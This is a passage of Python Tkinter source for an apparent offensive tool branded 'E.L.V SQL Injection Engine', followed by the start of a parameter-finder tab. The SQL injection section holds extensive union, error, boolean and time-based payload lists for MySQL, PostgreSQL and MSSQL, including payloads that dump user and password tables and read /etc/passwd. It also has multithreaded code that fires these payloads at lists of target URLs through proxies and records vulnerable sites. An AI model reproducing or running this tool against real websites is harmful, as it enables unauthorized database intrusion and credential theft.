        self.proxy_entry = tk.Entry(fields_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'], relief=tk.FLAT, borderwidth=1)
        self.proxy_entry.grid(row=4, column=1, sticky=tk.EW, padx=(5, 0), pady=3)
        tk.Label(fields_frame, text='Threads:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).grid(row=5, column=0, sticky=tk.W, pady=3)
        self.threads_entry = tk.Entry(fields_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'], relief=tk.FLAT, borderwidth=1, width=10)
        self.threads_entry.insert(0, '10')
        self.threads_entry.grid(row=5, column=1, sticky=tk.W, padx=(5, 0), pady=3)
        tk.Label(fields_frame, text='Timeout (s):', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).grid(row=6, column=0, sticky=tk.W, pady=3)
        self.timeout_entry = tk.Entry(fields_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'], relief=tk.FLAT, borderwidth=1, width=10)
        self.timeout_entry.insert(0, '10')
        self.timeout_entry.grid(row=6, column=1, sticky=tk.W, padx=(5, 0), pady=3)
        fields_frame.columnconfigure(1, weight=1)

    def browse_target_file(self):
        filename = filedialog.askopenfilename(title='Select Target File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.target_entry.delete(0, tk.END)
            self.target_entry.insert(0, filename)

    def setup_log_area(self, parent):
        log_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=2, highlightbackground=self.colors['fg_red'], highlightthickness=1)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 8))
        tk.Label(log_frame, text='[EXPLOIT LOG]', font=('Courier', 10, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        log_text_frame = tk.Frame(log_frame, bg=self.colors['bg'])
        log_text_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))
        scrollbar_log = tk.Scrollbar(log_text_frame)
        scrollbar_log.pack(side=tk.RIGHT, fill=tk.Y)
        self.log_text = tk.Text(log_text_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'], relief=tk.FLAT, borderwidth=0, wrap=tk.WORD, height=10, yscrollcommand=scrollbar_log.set)
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar_log.config(command=self.log_text.yview)
        self.log_text.tag_config('green', foreground=self.colors['fg_green'])
        self.log_text.tag_config('cyan', foreground=self.colors['fg_cyan'])
        self.log_text.tag_config('yellow', foreground=self.colors['fg_yellow'])
        self.log_text.tag_config('red', foreground=self.colors['fg_red'])
        self.log_text.tag_config('purple', foreground=self.colors['fg_purple'])

    def setup_results_area(self, parent):
        results_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=2, highlightbackground=self.colors['fg_green'], highlightthickness=1)
        results_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 8))
        tk.Label(results_frame, text='[VULNERABLE TARGETS]', font=('Courier', 10, 'bold'), fg=self.colors['fg_green'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        results_text_frame = tk.Frame(results_frame, bg=self.colors['bg'])
        results_text_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))
        scrollbar_results = tk.Scrollbar(results_text_frame)
        scrollbar_results.pack(side=tk.RIGHT, fill=tk.Y)
        self.results_text = tk.Text(results_text_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], insertbackground=self.colors['fg_green'], relief=tk.FLAT, borderwidth=0, wrap=tk.WORD, height=6, yscrollcommand=scrollbar_results.set)
        self.results_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar_results.config(command=self.results_text.yview)
        self.results_text.tag_config('green', foreground=self.colors['fg_green'])
        self.results_text.tag_config('red', foreground=self.colors['fg_red'])
        self.results_text.tag_config('yellow', foreground=self.colors['fg_yellow'])

    def setup_stats(self, parent):
        stats_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=2, highlightbackground=self.colors['fg_red'], highlightthickness=1)
        stats_frame.pack(fill=tk.X, pady=(0, 8))
        self.stats_label = tk.Label(stats_frame, text='[STATS] Total: 0 | Processed: 0 | Vulnerable: 0 | Tested: 0', font=('Courier', 9, 'bold'), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W, padx=10, pady=6)
        self.stats_label.pack(fill=tk.X)

    def setup_control_buttons(self, parent):
        tk.Label(parent, text='[CONTROL PANEL]', font=('Courier', 9, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 6))
        button_container = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=2, highlightbackground=self.colors['fg_red'], highlightthickness=2)
        button_container.pack(fill=tk.X, pady=(0, 8))
        button_frame = tk.Frame(button_container, bg=self.colors['bg'])
        button_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.start_button = tk.Button(button_frame, text='[>> START EXPLOIT]', font=('Courier', 9, 'bold'), bg=BG_DARK, fg=self.colors['fg_red'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_red'], relief=tk.RAISED, borderwidth=2, command=self.start_exploit, width=20, height=2, cursor='hand2', highlightbackground=self.colors['fg_red'], highlightthickness=1)
        self.start_button.pack(fill=tk.X, pady=4)
        self.stop_button = tk.Button(button_frame, text='[<< STOP]', font=('Courier', 9, 'bold'), bg=BG_DARK, fg=self.colors['fg_red'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_red'], relief=tk.RAISED, borderwidth=2, command=self.stop_exploit, width=20, height=2, state=tk.DISABLED, cursor='hand2', highlightbackground=self.colors['fg_red'], highlightthickness=1)
        self.stop_button.pack(fill=tk.X, pady=4)
        self.clear_button = tk.Button(button_frame, text='[XX CLEAR]', font=('Courier', 9, 'bold'), bg=BG_DARK, fg=self.colors['fg_yellow'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_yellow'], relief=tk.RAISED, borderwidth=2, command=self.clear_logs, width=20, height=2, cursor='hand2', highlightbackground=self.colors['fg_yellow'], highlightthickness=1)
        self.clear_button.pack(fill=tk.X, pady=4)
        self.save_button = tk.Button(button_frame, text='[$$ SAVE]', font=('Courier', 9, 'bold'), bg=BG_DARK, fg=self.colors['fg_cyan'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_cyan'], relief=tk.RAISED, borderwidth=2, command=self.save_results, width=20, height=2, cursor='hand2', highlightbackground=self.colors['fg_cyan'], highlightthickness=1)
        self.save_button.pack(fill=tk.X, pady=4)

    def setup_payload_options(self, parent):
        payload_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=2, highlightbackground=self.colors['fg_cyan'], highlightthickness=1)
        payload_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(payload_frame, text='[PAYLOAD OPTIONS]', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        options_inner = tk.Frame(payload_frame, bg=self.colors['bg'])
        options_inner.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.technique_var = tk.StringVar(value='all')
        techniques = [('All Techniques', 'all'), ('Union-Based', 'union'), ('Error-Based', 'error'), ('Boolean-Based', 'boolean'), ('Time-Based', 'time')]
        for text, value in techniques:
            tk.Radiobutton(options_inner, text=text, variable=self.technique_var, value=value, font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.db_type_var = tk.StringVar(value='auto')
        tk.Label(options_inner, text='Database:', font=('Courier', 8, 'bold'), fg=self.colors['fg'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(8, 2))
        db_types = [('Auto-Detect', 'auto'), ('MySQL', 'mysql'), ('PostgreSQL', 'postgresql'), ('MSSQL', 'mssql'), ('Oracle', 'oracle'), ('SQLite', 'sqlite')]
        for text, value in db_types:
            tk.Radiobutton(options_inner, text=text, variable=self.db_type_var, value=value, font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=1)
        self.advanced_var = tk.BooleanVar(value=False)
        tk.Checkbutton(options_inner, text='Advanced Exploitation', variable=self.advanced_var, font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=(8, 2))

    def log(self, message, color='fg'):
        timestamp = time.strftime('[%H:%M:%S]')
        log_msg = f'{timestamp} {message}\n'
        self.log_queue.put((log_msg, color))

    def process_log_queue(self):
        try:
            while True:
                log_msg, color = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, log_msg, color)
                self.log_text.see(tk.END)
                lines = int(self.log_text.index('end-1c').split('.')[0])
                if lines > 200:
                    self.log_text.delete(1.0, f'{lines - 100}.0')
        except queue.Empty:
            pass
        self.frame.after(100, self.process_log_queue)

    def process_stats_queue(self):
        try:
            while True:
                stats_update = self.stats_queue.get_nowait()
                self.stats.update(stats_update)
                stats_text = f"[STATS] Total: {self.stats['total']} | Processed: {self.stats['processed']} | Vulnerable: {self.stats['vulnerable']} | Tested: {self.stats['tested']}"
                self.stats_label.config(text=stats_text)
        except queue.Empty:
            pass
        self.frame.after(500, self.process_stats_queue)

    def clear_logs(self):
        self.log_text.delete(1.0, tk.END)
        self.results_text.delete(1.0, tk.END)
        self.log('Log cleared', 'fg_cyan')

    def get_sqli_payloads(self, technique='all', db_type='auto'):
        payloads = []
        if technique == 'all' or technique == 'union':
            if db_type == 'auto' or db_type == 'mysql':
                payloads.extend(["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,2,3--", "' UNION SELECT user(),database(),version()--", "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--", "' UNION ALL SELECT NULL--", "' UNION SELECT @@version,NULL--", "' UNION SELECT NULL,@@version--", "') UNION SELECT NULL--", "')) UNION SELECT NULL--", "' UNION SELECT * FROM information_schema.tables--", "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--", "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "' UNION SELECT NULL,CONCAT(user,0x3a,pass) FROM users--", "' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--", "' UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--", "' UNION SELECT 1,LOAD_FILE('/etc/passwd')--", "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--"])
            if db_type == 'auto' or db_type == 'postgresql':
                payloads.extend(["' UNION SELECT NULL--", "' UNION SELECT NULL::text--", "' UNION SELECT version(),current_user,current_database()--", "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--", "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "' UNION SELECT usename,passwd FROM pg_user--", "' UNION SELECT NULL,string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'--"])
            if db_type == 'auto' or db_type == 'mssql':
                payloads.extend(["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT @@version,user_name(),db_name()--", "' UNION SELECT table_name FROM information_schema.tables--", "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "' UNION SELECT name,password FROM sysusers--", "' UNION SELECT NULL,CHAR(65)+CHAR(66)+CHAR(67)--"])
        if technique == 'all' or technique == 'error':
            if db_type == 'auto' or db_type == 'mysql':
                payloads.extend(["' AND extractvalue(rand(),concat(0x3a,version()))--", "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "' AND updatexml(1,concat(0x3a,version()),1)--", "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--", "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"])
            if db_type == 'auto' or db_type == 'postgresql':
                payloads.extend(["' AND cast(version() as int)--", "' AND 1=cast((SELECT version()) as int)--", "' AND 1=(SELECT CAST(version() AS int))--"])
            if db_type == 'auto' or db_type == 'mssql':
                payloads.extend(["' AND 1=convert(int,@@version)--", "' AND convert(int,@@version)--", "' AND 1=cast((SELECT @@version) as int)--"])
        if technique == 'all' or technique == 'boolean':
            payloads.extend(["' AND 1=1--", "' AND 1=2--", "' OR 1=1--", "' OR 1=2--", "') AND 1=1--", "') AND 1=2--", "')) AND 1=1--", "')) AND 1=2--", "' AND 'a'='a", "' AND 'a'='b", "' AND 1=1#", "' AND 1=2#", "' AND 'x'='x", "' AND 'x'='y"])
        if technique == 'all' or technique == 'time':
            if db_type == 'auto' or db_type == 'mysql':
                payloads.extend(["' AND SLEEP(5)--", "' AND (SELECT SLEEP(5))--", "' AND IF(1=1,SLEEP(5),0)--", "' AND IF(1=2,SLEEP(5),0)--", "' AND BENCHMARK(5000000,MD5(1))--", "'; WAITFOR DELAY '00:00:05'--"])
            if db_type == 'auto' or db_type == 'postgresql':
                payloads.extend(["' AND pg_sleep(5)--", "' AND (SELECT pg_sleep(5))--"])
            if db_type == 'auto' or db_type == 'mssql':
                payloads.extend(["'; WAITFOR DELAY '00:00:05'--", "' AND WAITFOR DELAY '00:00:05'--"])
        classic_payloads = ["' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*", "admin'--", "admin'#", "admin'/*", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", "') OR ('1'='1--", "' OR '1'='1'--", "' OR '1'='1'/*", "' UNION SELECT NULL--", "1' AND '1'='1", "1' AND '1'='2", "' OR 1=1 LIMIT 1--", "' OR 1=1 LIMIT 1#"]
        payloads.extend(classic_payloads)
        return payloads

    def test_sqli(self, url, param, payload, method='GET', data=None, proxy=None, timeout=10):
        try:
            parsed = urlparse(url)
            if not parsed.scheme:
                url = 'http://' + url
            proxies = None
            if proxy:
                proxies = {'http': proxy, 'https': proxy}
            headers = DEFAULT_HEADERS.copy()
            if method == 'GET':
                params = {param: payload}
                response = requests.get(url, params=params, headers=headers, proxies=proxies, timeout=timeout, verify=False, allow_redirects=True)
            else:
                if data:
                    try:
                        post_data = json.loads(data) if data.strip().startswith('{') else {k: v for k, v in [x.split('=') for x in data.split('&')]}
                        post_data[param] = payload
                    except:
                        post_data = {param: payload}
                else:
                    post_data = {param: payload}
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                response = requests.post(url, data=post_data, headers=headers, proxies=proxies, timeout=timeout, verify=False, allow_redirects=True)
            return response
        except:
            return None

    def detect_sqli(self, base_response, test_response, payload):
        if not base_response or not test_response:
            return False
        try:
            base_len = len(base_response.text)
            test_len = len(test_response.text)
            if base_len != test_len:
                return True
            error_indicators = ['sql syntax', 'mysql_fetch', 'mysql_num_rows', 'mysql_query', 'postgresql', 'pg_query', 'pg_exec', 'pg_fetch', 'mssql', 'sql server', 'odbc', 'ado db', 'oracle', 'ora-', 'oci_', 'quoted string not properly', 'sqlite', 'sqlite3', 'database disk image is malformed', 'warning:', 'fatal error', 'syntax error', 'unclosed quotation mark', 'unterminated quoted string', 'you have an error in your sql syntax', 'unknown column', "table doesn't exist", 'no such table']
            for indicator in error_indicators:
                if indicator.lower() in test_response.text.lower() and indicator.lower() not in base_response.text.lower():
                    return True
            if test_response.status_code == 500 and base_response.status_code != 500:
                return True
            time_based_patterns = ['sleep', 'waitfor', 'benchmark', 'pg_sleep']
            for pattern in time_based_patterns:
                if pattern.lower() in payload.lower():
                    start_time = time.time()
                    test_response = self.test_sqli(test_response.url if hasattr(test_response, 'url') else '', self.param_entry.get(), payload, self.method_var.get(), self.data_entry.get(), self.proxy_entry.get(), timeout=15)
                    elapsed = time.time() - start_time
                    if elapsed > 4:
                        return True
            return False
        except:
            return False

    def start_exploit(self):
        if self.is_running:
            return
        target = self.target_entry.get().strip()
        param = self.param_entry.get().strip()
        if not target:
            messagebox.showerror('Error', 'Please enter a target URL or select a target file!')
            return
        if not param:
            messagebox.showerror('Error', 'Please enter parameter name!')
            return
        targets = []
        if os.path.isfile(target):
            try:
                with open(target, 'r', encoding='utf-8') as f:
                    targets = [line.strip() for line in f if line.strip()]
            except Exception as e:
                messagebox.showerror('Error', f'Error reading target file: {str(e)}')
                return
        else:
            targets = [target]
        if not targets:
            messagebox.showerror('Error', 'No valid targets found!')
            return
        try:
            threads = int(self.threads_entry.get().strip() or '10')
            threads = min(threads, 50)
        except:
            threads = 10
        try:
            timeout = int(self.timeout_entry.get().strip() or '10')
        except:
            timeout = 10
        self.is_running = True
        self.stop_flag = False
        self.results = []
        self.vulnerable_urls = []
        self.stats = {'total': len(targets), 'processed': 0, 'vulnerable': 0, 'tested': 0}
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.results_text.delete(1.0, tk.END)
        self.log(f'[START] Testing {len(targets)} targets | {threads} threads', 'fg_green')
        thread = threading.Thread(target=self.exploit_worker, args=(targets, param, threads, timeout), daemon=True)
        thread.start()

    def stop_exploit(self):
        self.stop_flag = True
        self.log('[STOP] Exploit halted', 'fg_yellow')

    def exploit_worker(self, targets, param, threads, timeout):
        from concurrent.futures import ThreadPoolExecutor, as_completed
        technique = self.technique_var.get()
        db_type = self.db_type_var.get()
        method = self.method_var.get()
        data = self.data_entry.get().strip()
        proxy = self.proxy_entry.get().strip() or None
        advanced = self.advanced_var.get()
        payloads = self.get_sqli_payloads(technique, db_type)

        def test_target(target_url):
            if self.stop_flag:
                return
            try:
                parsed = urlparse(target_url)
                if not parsed.scheme:
                    target_url = 'http://' + target_url
                self.log(f'[TEST] {target_url}', 'fg_cyan')
                base_payload = '1'
                base_response = self.test_sqli(target_url, param, base_payload, method, data, proxy, timeout)
                if not base_response:
                    with self.stats_lock:
                        self.stats['processed'] += 1
                        self.stats_queue.put({'processed': self.stats['processed']})
                    return
                tested_count = 0
                for payload in payloads[:50]:
                    if self.stop_flag:
                        break
                    tested_count += 1
                    test_response = self.test_sqli(target_url, param, payload, method, data, proxy, timeout)
                    if self.detect_sqli(base_response, test_response, payload):
                        result = {'url': target_url, 'param': param, 'payload': payload, 'status_code': test_response.status_code if test_response else 0, 'vulnerable': True}
                        with self.stats_lock:
                            self.vulnerable_urls.append(result)
                            self.results.append(result)
                            self.stats['processed'] += 1
                            self.stats['vulnerable'] += 1
                            self.stats['tested'] += tested_count
                            self.stats_queue.put({'processed': self.stats['processed'], 'vulnerable': self.stats['vulnerable'], 'tested': self.stats['tested']})
                        self.log(f'[!!! VULNERABLE !!!] {target_url} | Payload: {payload[:50]}...', 'fg_red')
                        result_text = f'[VULN] {target_url} | Param: {param} | Payload: {payload[:60]}\n'
                        self.frame.after_idle(lambda rt=result_text: self.results_text.insert(tk.END, rt, 'red'))
                        self.frame.after_idle(lambda: self.results_text.see(tk.END))
                        break
                    time.sleep(0.1)
                with self.stats_lock:
                    if not any((r['url'] == target_url for r in self.results)):
                        self.stats['processed'] += 1
                        self.stats['tested'] += tested_count
                        self.stats_queue.put({'processed': self.stats['processed'], 'tested': self.stats['tested']})
            except Exception as e:
                with self.stats_lock:
                    self.stats['processed'] += 1
                    self.stats_queue.put({'processed': self.stats['processed']})
        try:
            max_workers = min(threads, 20)
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {executor.submit(test_target, target): target for target in targets}
                for future in as_completed(futures):
                    if self.stop_flag:
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                    try:
                        future.result(timeout=30)
                    except:
                        pass
        except:
            pass
        self.is_running = False
        self.frame.after_idle(self.exploit_finished)

    def exploit_finished(self):
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.log(f"[DONE] Vulnerable: {self.stats['vulnerable']} | Tested: {self.stats['tested']} payloads", 'fg_yellow')
        if self.results:
            self.log(f'[FOUND] {len(self.results)} vulnerable target(s)!', 'fg_green')

    def save_results(self):
        if not self.results:
            messagebox.showwarning('Warning', 'No results to save!')
            self.log('No results to save', 'fg_yellow')
            return
        filename = filedialog.asksaveasfilename(title='Save Results', defaultextension='.txt', filetypes=[('Text files', '*.txt'), ('JSON files', '*.json'), ('All files', '*.*')])
        if filename:
            try:
                if filename.endswith('.json'):
                    with open(filename, 'w', encoding='utf-8') as f:
                        json.dump(self.results, f, indent=2, ensure_ascii=False)
                else:
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write('E.L.V SQL INJECTION ENGINE RESULTS\n')
                        f.write('=' * 60 + '\n\n')
                        for result in self.results:
                            f.write(f"URL: {result['url']}\n")
                            f.write(f"Parameter: {result['param']}\n")
                            f.write(f"Payload: {result['payload']}\n")
                            f.write(f"Status Code: {result['status_code']}\n")
                            f.write(f"Vulnerable: {result['vulnerable']}\n")
                            f.write('-' * 60 + '\n')
                self.log(f'Results saved to: {filename}', 'fg_green')
                messagebox.showinfo('Success', f'Results saved to:\n{filename}')
            except Exception as e:
                messagebox.showerror('Error', f'Error saving results: {str(e)}')

class ParamFinderTab(BaseTab):

    def __init__(self, parent, colors, control_panel=None):
        super().__init__(parent, colors, control_panel)
        self.is_running = False
        self.stop_flag = False
        self.found_params = set()
        self.found_params_file = None
        self.log_queue = queue.Queue()
        self.stats_queue = queue.Queue()
        self.stats = {'total': 0, 'processed': 0, 'found': 0}
        self.stats_lock = threading.Lock()
        self.setup_tab()
        self.process_log_queue()
        self.process_stats_queue()

    def setup_tab(self):
        self.add_back_button()
        title = tk.Label(self.frame, text='PARAM FINDER', font=('Courier', 20, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg'])
        title.pack(pady=10)
        main_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        left_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        right_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        input_frame = tk.Frame(left_frame, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        input_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(input_frame, text='Target URL/File (e.g: car.php?id=10 or file with URLs):', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        url_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        url_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.url_entry = tk.Entry(url_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'])
        self.url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        tk.Button(url_frame, text='Browse', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=self.browse_file).pack(side=tk.LEFT)
        options_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        options_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(options_frame, text='Threads:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.threads_entry = tk.Entry(options_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], width=8)
        self.threads_entry.insert(0, '10')
        self.threads_entry.pack(side=tk.LEFT, padx=(0, 10))
        tk.Label(options_frame, text='Timeout:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.timeout_entry = tk.Entry(options_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], width=8)
        self.timeout_entry.insert(0, '15')
        self.timeout_entry.pack(side=tk.LEFT, padx=(0, 10))
        tk.Label(options_frame, text='Proxy:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.proxy_entry = tk.Entry(options_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], width=20)
        self.proxy_entry.pack(side=tk.LEFT)
        button_frame = tk.Frame(left_frame, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, pady=(0, 8))
        self.start_button = tk.Button(button_frame, text='[START SCAN]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_green'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_green'], command=self.start_scan, width=18, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        self.start_button.pack(side=tk.LEFT, padx=(0, 5), fill=tk.X, expand=True)
        self.stop_button = tk.Button(button_frame, text='[STOP]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_red'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_red'], command=self.stop_scan, width=18, height=2, relief=tk.RAISED, borderwidth=2, state=tk.DISABLED, cursor='hand2')
        self.stop_button.pack(side=tk.LEFT, padx=(0, 5), fill=tk.X, expand=True)
        self.save_button = tk.Button(button_frame, text='[SAVE RESULTS]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_cyan'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_cyan'], command=self.save_results, width=18, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        self.save_button.pack(side=tk.LEFT, fill=tk.X, expand=True)
        stats_frame = tk.Frame(left_frame, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        stats_frame.pack(fill=tk.X, pady=(0, 8))
        self.stats_label = tk.Label(stats_frame, text='Total: 0 | Processed: 0 | Found: 0', font=('Courier', 9), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W, padx=5, pady=5)
        self.stats_label.pack(fill=tk.X)
        tk.Label(left_frame, text='Log:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 3))
        self.log_text = scrolledtext.ScrolledText(left_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], height=12, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        tk.Label(right_frame, text='Found Parameters:', font=('Courier', 10, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 5))
        self.params_text = scrolledtext.ScrolledText(right_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=35, wrap=tk.WORD)
        self.params_text.pack(fill=tk.BOTH, expand=True)

    def browse_file(self):
        filename = filedialog.askopenfilename(title='Select URL File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.url_entry.delete(0, tk.END)
            self.url_entry.insert(0, filename)

    def log(self, message, color='fg'):
        timestamp = time.strftime('[%H:%M:%S]')
        self.log_queue.put((f'{timestamp} {message}\n', color))

    def process_log_queue(self):
        try:
            while True:
                log_msg, color = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, log_msg)
                self.log_text.see(tk.END)
                line_count = int(self.log_text.index('end-1c').split('.')[0])
                if line_count >= 200:
                    self.log_text.delete(1.0, f'{line_count - 100}.0')
        except queue.Empty:
            pass
        self.frame.after(100, self.process_log_queue)

    def process_stats_queue(self):
        try:
            while True:
                stats = self.stats_queue.get_nowait()
                with self.stats_lock:
                    self.stats.update(stats)
                self.stats_label.config(text=f"Total: {self.stats['total']} | Processed: {self.stats['processed']} | Found: {self.stats['found']}")
        except queue.Empty:
            pass
        self.frame.after(500, self.process_stats_queue)

    def start_scan(self):
        if self.is_running:
            return
        url_input = self.url_entry.get().strip()
        if not url_input:
            messagebox.showwarning('Warning', 'Please enter URL or select file!')
            return
        try:
            threads = int(self.threads_entry.get())
            if threads < 1:
                threads = 1
            if threads > 20:
                threads = 20
        except:
            threads = 10
        try:
            timeout = int(self.timeout_entry.get())
            if timeout < 1:
                timeout = 15
            if timeout > 60:
                timeout = 60
        except:
            timeout = 15
        proxy = self.proxy_entry.get().strip()
        if proxy and (not proxy.startswith('http')):
            proxy = 'http://' + proxy
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        self.found_params_file = f'param_finder_{timestamp}.txt'
        self.is_running = True
        self.stop_flag = False
        self.found_params = set()
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.log(f'Starting parameter extraction...')
        thread = threading.Thread(target=self.param_finder_worker, args=(url_input, threads, timeout, proxy), daemon=True)
        thread.start()

    def stop_scan(self):
        self.stop_flag = True
        self.is_running = False
        self.stop_button.config(state=tk.DISABLED)
        self.start_button.config(state=tk.NORMAL)
        self.log('Scan stopped')

    def extract_params_from_url(self, url):
        params = set()
        try:
            parsed = urlparse(url)
            query = parsed.query
            if query:
                from urllib.parse import parse_qs, unquote
                parsed_params = parse_qs(query, keep_blank_values=True)
                params.update(parsed_params.keys())
            fragment = parsed.fragment
            if fragment and '=' in fragment:
